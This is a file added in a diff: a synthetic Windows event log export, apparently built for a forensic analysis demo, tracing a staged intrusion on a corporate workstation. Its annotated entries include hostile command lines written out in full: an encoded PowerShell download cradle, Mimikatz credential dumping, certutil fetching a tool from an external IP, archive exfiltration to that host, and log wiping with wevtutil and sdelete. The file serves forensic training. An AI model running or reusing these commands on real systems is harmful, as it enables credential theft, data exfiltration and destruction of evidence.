@@ -1,0 +1,153 @@
+Windows Event Log Export - Synthetic Attack Scenario
+Generated for LogIQ Forensic Analysis Demo
+=======================================================
+
+Date: 2026-04-15
+Hostname: CORP-WS-042
+Domain: CORP.LOCAL
+=======================================================
+
+Event ID: 4688
+Time: 2026-04-15 08:14:32 UTC
+Source: Microsoft-Windows-Security-Auditing
+Subject Account: CORP\jsmith
+Process Name: C:\Windows\System32\cmd.exe
+New Process Name: C:\Users\jsmith\AppData\Local\Temp\invoice_q1.doc.exe
+Description: A new process has been created. User opened a suspicious executable disguised as a Word document received via phishing email.
+
+Event ID: 4688
+Time: 2026-04-15 08:14:45 UTC
+Source: Microsoft-Windows-Security-Auditing
+Subject Account: CORP\jsmith
+Process Name: C:\Users\jsmith\AppData\Local\Temp\invoice_q1.doc.exe
+New Process Name: C:\Windows\System32\wscript.exe
+Description: A new process has been created. Macro execution initiated via Windows Script Host.
+
+Event ID: 4688
+Time: 2026-04-15 08:14:52 UTC
+Source: Microsoft-Windows-Security-Auditing
+Subject Account: CORP\jsmith
+Process Name: C:\Windows\System32\wscript.exe
+New Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+CommandLine: powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwADQALgAyADEALgA4ADcALgAxADMAMwAvAHMAdABhAGcAZQAyAC4AcABzADEAIgApAA==
+Description: PowerShell launched with encoded command, execution policy bypass, and hidden window. Indicative of fileless malware download.
+
+Event ID: 7045
+Time: 2026-04-15 08:15:10 UTC
+Source: Service Control Manager
+Account: LocalSystem
+Service Name: WindowsUpdateHelper
+Service File Name: C:\Windows\System32\svchost.exe -k netsvcs -p -s WindowsUpdateHelper
+Service Type: Win32OwnProcess
+Start Type: AutoStart
+Description: A new service was installed. Service name mimics legitimate Windows Update process for persistence.
+
+Event ID: 4698
+Time: 2026-04-15 08:15:22 UTC
+Source: Microsoft-Windows-Security-Auditing
+Subject Account: CORP\jsmith
+Task Name: \Microsoft\Windows\WindowsUpdateHelper
+Task Content: <?xml version="1.0"?><Task><Triggers><TimeTrigger><StartBoundary>2026-04-15T08:30:00</StartBoundary><RepetitionInterval>PT10M</RepetitionInterval></TimeTrigger></Triggers><Actions><Exec><Command>powershell.exe</Command><Arguments>-NoP -W Hidden -EP Bypass -File C:\Windows\Temp\wu_helper.ps1</Arguments></Exec></Actions></Task>
+Description: A scheduled task was created to execute a PowerShell script every 10 minutes. Classic persistence via scheduled task mechanism.
+
+Event ID: 4624
+Time: 2026-04-15 08:17:03 UTC
+Source: Microsoft-Windows-Security-Auditing
+Account Name: CORP\jsmith
+Logon Type: 3
+Source Network Address: 10.0.0.42
+Workstation Name: CORP-WS-042
+Authentication Package: NTLM
+Description: Successful network logon. NTLM authentication used for lateral movement to additional workstation.
+
+Event ID: 4624
+Time: 2026-04-15 08:17:44 UTC
+Source: Microsoft-Windows-Security-Auditing
+Account Name: CORP\administrator
+Logon Type: 3
+Source Network Address: 10.0.0.42
+Workstation Name: CORP-DC-01
+Authentication Package: Kerberos
+Description: Administrator account logged on to domain controller from compromised workstation. Possible credential reuse after dumping.
+
+Event ID: 4688
+Time: 2026-04-15 08:18:01 UTC
+Source: Microsoft-Windows-Security-Auditing
+Subject Account: CORP\administrator
+Process Name: C:\Windows\System32\cmd.exe
+New Process Name: C:\Windows\Temp\mimi.exe
+CommandLine: mimi.exe privilege::debug sekurlsa::logonpasswords exit
+Description: Mimikatz executed on domain controller. Credential dumping of all logged-on user NTLM hashes and Kerberos tickets in memory.
+
+Event ID: 4776
+Time: 2026-04-15 08:18:15 UTC
+Source: Microsoft-Windows-Security-Auditing
+Account Name: CORP\svc_backup
+Error Code: 0x0
+Workstation: CORP-DC-01
+Description: Domain controller validated credentials for service account svc_backup. Account likely harvested from mimikatz dump and reused.
+
+Event ID: 4776
+Time: 2026-04-15 08:18:16 UTC
+Source: Microsoft-Windows-Security-Auditing
+Account Name: CORP\svc_sql
+Error Code: 0x0
+Workstation: CORP-DC-01
+Description: Domain controller validated credentials for svc_sql service account. Second service account credential validated in rapid succession.
+
+Event ID: 4688
+Time: 2026-04-15 08:22:14 UTC
+Source: Microsoft-Windows-Security-Auditing
+Subject Account: CORP\administrator
+Process Name: C:\Windows\System32\cmd.exe
+New Process Name: C:\Windows\System32\rar.exe
+CommandLine: rar.exe a -v500m -hp$tr0ng3ncrypt! C:\Windows\Temp\data_out.rar C:\Users\jsmith\Documents\* C:\Shares\Finance\*
+Description: RAR archiving tool used to compress and password-encrypt user documents and finance share contents. Staging for exfiltration.
+
+Event ID: 4688
+Time: 2026-04-15 08:23:55 UTC
+Source: Microsoft-Windows-Security-Auditing
+Subject Account: CORP\administrator
+Process Name: C:\Windows\System32\cmd.exe
+New Process Name: C:\Windows\System32\certutil.exe
+CommandLine: certutil.exe -urlcache -split -f http://104.21.87.133/upload.php C:\Windows\Temp\uploader.exe
+Description: Certutil used to download exfiltration tool from external IP. Living-off-the-land technique abusing legitimate Windows binary.
+
+Event ID: 4688
+Time: 2026-04-15 08:25:10 UTC
+Source: Microsoft-Windows-Security-Auditing
+Subject Account: CORP\administrator
+Process Name: C:\Windows\Temp\uploader.exe
+New Process Name: C:\Windows\Temp\uploader.exe
+CommandLine: uploader.exe --host 104.21.87.133 --port 443 --file C:\Windows\Temp\data_out.rar --chunk 1024
+Description: Data exfiltration executable transferring compressed archive to external command and control server over HTTPS port 443.
+
+Event ID: 1102
+Time: 2026-04-15 08:27:33 UTC
+Source: Microsoft-Windows-Security-Auditing
+Subject Account: CORP\administrator
+Description: The audit log was cleared. Security event log manually wiped by attacker to cover tracks after completing exfiltration.
+
+Event ID: 4688
+Time: 2026-04-15 08:27:45 UTC
+Source: Microsoft-Windows-Security-Auditing
+Subject Account: CORP\administrator
+Process Name: C:\Windows\System32\cmd.exe
+New Process Name: C:\Windows\System32\wevtutil.exe
+CommandLine: wevtutil.exe cl System && wevtutil.exe cl Application && wevtutil.exe cl Security
+Description: Windows Event Utility used to clear System, Application, and Security logs. Anti-forensics activity to hinder investigation.
+
+Event ID: 4688
+Time: 2026-04-15 08:28:02 UTC
+Source: Microsoft-Windows-Security-Auditing
+Subject Account: CORP\administrator
+Process Name: C:\Windows\System32\cmd.exe
+New Process Name: C:\Windows\System32\sdelete.exe
+CommandLine: sdelete.exe -p 3 C:\Windows\Temp\mimi.exe C:\Windows\Temp\uploader.exe C:\Windows\Temp\data_out.rar
+Description: Sysinternals SDelete used to securely wipe attack tools and staged data from disk. Three-pass overwrite to prevent forensic recovery.
+
+=======================================================
+END OF LOG EXPORT
+Total Events: 16
+Export Time: 2026-04-15 08:30:00 UTC
+=======================================================
